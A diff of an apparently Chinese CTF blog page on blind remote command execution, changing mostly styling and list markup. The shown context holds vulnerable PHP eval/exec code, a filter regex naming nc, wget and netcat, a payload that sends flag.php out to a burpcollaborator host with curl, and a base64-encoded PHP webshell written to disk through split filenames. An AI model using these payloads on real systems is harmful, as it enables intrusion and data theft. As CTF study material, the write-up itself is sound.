@@ -30,7 +30,7 @@
                 style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
                 <div>
                     <h2>LOADING...</h2>
-                    <p>dadadadadada~</p>
+                    <p>dadada~</p>
                     <div>
                         <img src="/dancingkitty.gif" alt="loading">
                     </div>
@@ -183,7 +183,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/RCE" style=color:#879cff>
+                <a href="/tags/RCE" style=color:#00bcd4>
                     RCE
                 </a>
             </span>
@@ -200,8 +200,7 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45557476/article/details/121882666">rce无回显剖析</a></p>
 <h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><ul>
 <li><p>无回显RCE就是：在命令执行的时候，虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行</p>
-</li>
-<li><pre><code class="php">&lt;?php
+<pre><code class="php">&lt;?php
 highlight_file(__FILE__);
 $a=$_GET[&#39;a&#39;];
 exec(&quot;$a&quot;);
@@ -219,25 +218,23 @@ exec(&quot;$a&quot;);
 highlight_file(__FILE__);
 //flag.php
 if($F = @$_GET[&#39;F&#39;])&#123;
- if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F))&#123;
-     eval(substr($F,0,6));
- &#125;else&#123;
-     die(&quot;6个字母都还不够呀?!&quot;);
- &#125;
+if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F))&#123;
+  eval(substr($F,0,6));
+&#125;else&#123;
+  die(&quot;6个字母都还不够呀?!&quot;);
+&#125;
 &#125;
 </code></pre>
 <ul>
 <li><p>限制只能执行六个字符的命令，但是如果传递的参数就是<code>$F</code>本身，会发生变量覆盖</p>
 </li>
 <li><p>此处抄一手出题人wp：</p>
-</li>
-<li><pre><code class="txt">我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令
+<pre><code class="txt">我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令
 因为传递的`$F`;+sleep 3 先进行substr()函数截断然后去执行eval()函数,这个函数的作用是执行php代码
 ``是shell_exec()函数的缩写，然后就去命令执行,而$F就是我们输入的`$F`;+sleep 3 
 所以最后执行的代码应该是``$F`;+sleep 3`,就执行成功
 </code></pre>
-</li>
-<li><pre><code class="txt"># payload 
+<pre><code class="txt"># payload 
 #其中-F 为带文件的形式发送post请求
 #xx是上传文件的name值，flag.php就是上传的文件 
 ?F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
@@ -495,8 +492,7 @@ cat flag.php;
 <li><p>可写：<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p>
 </li>
 <li><p>将语句拆分写入（最后两句是重点）：</p>
-</li>
-<li><pre><code class="shell">&gt;hp  &gt;1.p\\  &gt;d\&gt;\\  &gt;\ -\\  &gt;e64\\  &gt;bas\\  &gt;7\|\\  &gt;XSk\\  &gt;Fsx\\
+<pre><code class="shell">&gt;hp  &gt;1.p\\  &gt;d\&gt;\\  &gt;\ -\\  &gt;e64\\  &gt;bas\\  &gt;7\|\\  &gt;XSk\\  &gt;Fsx\\
 &gt;dFV\\  &gt;kX0\\  &gt;bCg\\  &gt;XZh\\  &gt;AgZ\\  &gt;waH\\  &gt;PD9\\  &gt;o\ \\  &gt;ech\\
 ls -t&gt;0
 sh 0
